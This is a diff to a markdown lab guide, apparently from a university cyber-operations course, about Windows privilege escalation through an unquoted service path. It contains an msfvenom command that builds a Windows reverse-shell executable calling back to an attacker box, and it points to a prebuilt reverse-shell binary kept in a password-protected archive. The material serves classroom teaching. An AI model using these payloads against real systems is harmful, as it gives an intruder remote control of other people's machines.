@@ -36,7 +36,9 @@ Created for DSU's Cyber Operations I course
 #### Horizontal PrivEsc via Unquoted Service Path
 1. Log on to the standard user.
 2. Create a simple TCP reverse shell with `msfvenom` on the Linux Exercises box:
-      * In the example above, this would be Automated.exe
+      * In the example above, this would be `Automated.exe`.
+      * There is a preconfigured binary with IP address 192.168.0.2 and name `Automated.exe` in the Windows PrivEsc archive in the repo.
+          * Password: `infected`
 
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP address of Linux Exercises box> LPORT=1337 -f exe -o [First word of Level 2 Name].exe
